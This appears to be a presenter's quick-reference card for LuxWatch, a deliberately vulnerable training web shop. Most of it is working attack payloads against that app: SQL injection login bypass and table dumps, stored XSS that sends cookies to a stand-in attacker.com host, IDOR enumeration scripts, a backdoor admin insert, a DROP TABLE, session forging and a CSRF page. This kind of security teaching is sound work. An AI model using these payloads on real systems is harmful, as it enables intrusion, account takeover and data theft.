# 🎯 LuxWatch - Quick Reference Card

## Application URLs

- **Home:** http://localhost:3000
- **User Login:** http://localhost:3000/login.html
- **Admin Login:** http://localhost:3000/admin-login.html
- **User Dashboard:** http://localhost:3000/dashboard.html
- **Admin Panel:** http://localhost:3000/admin.html

## Default Credentials

### Admin
```
Username: admin
Password: admin123
```

### Regular Users
```
User 1: user / user123
User 2: john / password
```

## Quick Attack Examples

### 1. SQL Injection - Authentication Bypass
**Location:** Login form

**Payload:**
```
Username: admin' OR '1'='1' --
Password: [anything]
```

**Alternative:**
```
Username: admin' --
Password: [empty]
```

### 2. SQL Injection - Database Enumeration
**Location:** Search bar

**Payload:**
```
' UNION SELECT id, username, password, email, role, created_at FROM users --
```

### 3. Stored XSS - Cookie Theft
**Location:** Product reviews

**Payload:**
```javascript
<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>
```

**Better Payload:**
```javascript
<img src=x onerror="fetch('http://attacker.com/?data='+btoa(document.cookie))">
```

### 4. IDOR - Access Other Users
**Location:** Browser console or API

**Payloads:**
```javascript
// View user ID 1 (admin)
fetch('/api/users/1').then(r => r.json()).then(console.log)

// View user ID 2
fetch('/api/users/2').then(r => r.json()).then(console.log)

// Enumerate all users
for(let i=1; i<=10; i++) {
  fetch(`/api/users/${i}`)
    .then(r => r.json())
    .then(u => console.log(`${u.id}: ${u.username} / ${u.password}`))
}
```

### 5. IDOR - Access Other Orders
**Payloads:**
```javascript
// View order ID 1
fetch('/api/orders/1').then(r => r.json()).then(console.log)

// Enumerate orders
for(let i=1; i<=50; i++) {
  fetch(`/api/orders/${i}`)
    .then(r => r.json())
    .then(console.log)
    .catch(() => {})
}
```

### 6. Arbitrary SQL Execution
**Location:** Admin Panel → Debug SQL

**Payloads:**
```sql
-- Dump all tables
SELECT name FROM sqlite_master WHERE type='table';

-- View all users with passwords
SELECT * FROM users;

-- Create backdoor admin
INSERT INTO users (username, password, role) 
VALUES ('hacker', 'pwned', 'admin');

-- Change your role to admin
UPDATE users SET role='admin' WHERE username='user';

-- Destructive: Drop table (use cautiously!)
DROP TABLE reviews;
```

### 7. Session Token Prediction
**Location:** Browser console

**Pattern:** `userId_timestamp`

**Example:**
```javascript
// Current user session: "2_1768212345678"
// Predict admin session (user ID 1)
const adminToken = `1_${Date.now() - 5000}`;
document.cookie = `session=${adminToken}`;
location.reload();
```

### 8. CSRF - Add Malicious Product
Create `attack.html`:
```html
<html>
<body>
<form action="http://localhost:3000/api/admin/products" method="POST" id="csrf">
  <input type="hidden" name="name" value="Hacked Watch" />
  <input type="hidden" name="brand" value="Pwned" />
  <input type="hidden" name="description" value="<script>alert('XSS')</script>" />
  <input type="hidden" name="price" value="1" />
  <input type="hidden" name="image" value="hack.jpg" />
  <input type="hidden" name="stock" value="999" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

## API Endpoints Reference

### Public Endpoints
```
POST   /api/login          - User/admin login
POST   /api/register       - User registration
POST   /api/logout         - Logout
GET    /api/products       - List all products
GET    /api/products/:id   - Get product details
GET    /api/search?q=...   - Search products (SQL injection)
GET    /api/products/:id/reviews - Get product reviews
```

### Authenticated User Endpoints
```
GET    /api/user           - Get current user info
GET    /api/users/:id      - Get any user (IDOR)
POST   /api/orders         - Create new order
GET    /api/orders/my      - Get current user's orders
GET    /api/orders/:id     - Get any order (IDOR)
POST   /api/reviews        - Add review (XSS vulnerable)
```

### Admin Endpoints
```
GET    /api/admin/users    - List all users
GET    /api/admin/orders   - List all orders
POST   /api/admin/products - Add product (CSRF)
PUT    /api/admin/products/:id - Update product (CSRF)
DELETE /api/admin/products/:id - Delete product (CSRF)
POST   /api/admin/query    - Execute SQL query (DANGEROUS!)
POST   /api/admin/upload   - Upload file
```

## Common Attack Chains

### Chain 1: Complete Takeover
```
1. SQL Injection in login → Bypass authentication
2. Access admin panel
3. Use debug SQL to dump database
4. Create permanent backdoor admin account
5. Inject XSS in product for persistence
```

### Chain 2: Data Exfiltration
```
1. Login as regular user
2. IDOR to enumerate all users
3. Extract passwords (stored in plain text)
4. IDOR to enumerate all orders
5. Build complete customer database
```

### Chain 3: Session Hijacking
```
1. Inject XSS in product review
2. Wait for admin to view product
3. Steal admin session cookie
4. Use stolen session to access admin panel
5. Execute arbitrary SQL for full control
```

## Setup Commands

### Local Setup
```bash
# Install dependencies
npm install

# Start server
npm start

# Or use setup script
./setup.sh
```

### Docker Setup
```bash
# Using docker-compose
docker-compose up -d

# View logs
docker-compose logs -f

# Stop containers
docker-compose down
```

## File Structure

```
web-chain/
├── server.js              # Main Express server
├── database.js            # SQLite database layer
├── package.json           # Dependencies
├── Dockerfile             # Container config
├── docker-compose.yml     # Compose config
├── setup.sh               # Quick setup script
├── README.md              # Main documentation
├── VULNERABILITIES.md     # Vulnerability details
├── ATTACK_SCENARIOS.md    # Attack walkthroughs
└── public/
    ├── index.html         # Home page
    ├── login.html         # User login
    ├── admin-login.html   # Admin login
    ├── dashboard.html     # User dashboard
    ├── admin.html         # Admin panel
    ├── css/style.css      # Styles
    ├── js/main.js         # Client JS
    └── images/            # Product images
```

## Vulnerability Count

- **SQL Injection:** 3 locations
- **XSS:** 2 locations
- **CSRF:** All state-changing operations
- **IDOR:** 2 endpoints
- **Weak Auth:** Multiple issues
- **Info Disclosure:** 3 issues
- **Session Issues:** 4 problems
- **Broken Access Control:** 2 flaws
- **Total:** 9 categories, 20+ individual flaws

## Browser Console Helpers

### Quick User Enumeration
```javascript
async function dumpUsers() {
  for(let i=1; i<=20; i++) {
    const r = await fetch(`/api/users/${i}`);
    if(r.ok) {
      const u = await r.json();
      console.log(`[${u.id}] ${u.username}:${u.password} (${u.role})`);
    }
  }
}
dumpUsers();
```

### Quick Order Enumeration
```javascript
async function dumpOrders() {
  for(let i=1; i<=100; i++) {
    const r = await fetch(`/api/orders/${i}`);
    if(r.ok) {
      const o = await r.json();
      console.log(`Order ${i}: User ${o.user_id}, $${o.total_price}`);
    }
  }
}
dumpOrders();
```

## Tips for Presenters

1. **Start Simple:** Show normal functionality first
2. **Build Complexity:** Start with basic SQL injection, then chain attacks
3. **Show Impact:** Demonstrate real consequences of each vulnerability
4. **Explain Fixes:** After each exploit, briefly mention the fix
5. **Be Ethical:** Emphasize responsible disclosure and ethical hacking

## Resources

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **PortSwigger Academy:** https://portswigger.net/web-security
- **SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet

---

**Remember: Use responsibly and only in authorized environments!**
